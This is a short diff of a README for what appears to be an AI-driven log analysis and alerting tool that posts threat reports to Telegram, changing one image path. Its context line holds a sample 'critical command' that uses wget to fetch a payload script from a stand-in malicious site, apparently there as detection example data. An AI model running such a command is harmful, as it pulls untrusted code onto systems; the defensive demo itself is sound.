@@ -127,7 +127,7 @@ Critical Command,wget http-://malicious-site/payload.sh
 ### 1. The Result: AI-Generated Threat Report
 Real-time notification delivered via Telegram. The AI analyzes the raw logs, identifies the attack pattern (Brute-force/Reconnaissance), and summarizes the intent.
 
-![Threat Report](assets/demo_alert.png)
+![Threat Report](assets/telegram-output)
 
 
 ### 2. The Brain: Automation Logic (n8n)
